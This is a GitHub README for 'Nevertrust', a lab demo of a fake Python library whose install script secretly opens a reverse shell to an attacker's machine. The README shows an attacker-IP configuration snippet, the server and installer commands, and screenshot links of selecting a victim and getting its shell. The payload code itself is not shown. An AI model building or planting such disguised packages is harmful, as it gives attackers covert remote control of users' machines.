![image](https://github.com/ronch11/Nevertrust/assets/71279601/ebd373db-7a59-4e33-99cd-13fc527fed79)# Nevertrust

This project Simulates a fake library of python that when the target see the installation of the packets, there is a side channel that open a connection to attacker and give him possible Shellcode attack.
## Installation

You need to install socket and tqdm libraries
```bash
pip install socket tqdm 
```

## Preparations

First, you make sure that you insert the correct IP of the attacker in the client file.
```python
SERVER_HOST = "IP_of_attacker"
SERVER_PORT = 5004
BUFFER_SIZE = 1440  # max size of messages, setting to 1440 after experimentation, MTU size
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>
```

# Run
We will be use with two machine, the first one will be Parrot is for the attacker and the second, Kali Linux for the target.


```
python server.py
```
![צילום מסך 2024-01-25 065805](https://github.com/ronch11/Nevertrust/assets/71279601/bd3e7152-2010-4b24-b127-b0101115d547)

Now let's install our library on the client
```bash
python3 my_install.py 
```
![צילום מסך 2024-01-25 081905](https://github.com/ronch11/Nevertrust/assets/71279601/c0f5c945-c830-47cb-81ad-5cb2a8d004ea)

![צילום מסך 2024-01-25 082236](https://github.com/ronch11/Nevertrust/assets/71279601/33d66ea4-6800-403f-946b-b18aa26f9a2b)


Now let's check the connction between the sides

we can see that connction success
![צילום מסך 2024-01-25 082621](https://github.com/ronch11/Nevertrust/assets/71279601/f553ad0a-14e1-4f89-9a1e-71149e671a3b)


For see all targets we can use with the command list
![צילום מסך 2024-01-25 083157](https://github.com/ronch11/Nevertrust/assets/71279601/957d25c4-64be-4f98-9372-399362f8ad6a)

To choose the target we use with the command use X
X - will be the choosen index  
![צילום מסך 2024-01-25 083413](https://github.com/ronch11/Nevertrust/assets/71279601/0133d92a-2193-4101-babc-6e7699e8c95c)

Now we can see that we are in the shell of the target!
Let's cheek the IP of the target
![צילום מסך 2024-01-25 084225](https://github.com/ronch11/Nevertrust/assets/71279601/6d212c82-3fe2-42b7-a3b4-d445915f6006)

 We can see that we get the same IP address on the Parrot shell
![צילום מסך 2024-01-25 084416](https://github.com/ronch11/Nevertrust/assets/71279601/a48de220-54ae-49c7-8e5f-24dc1c82101f)
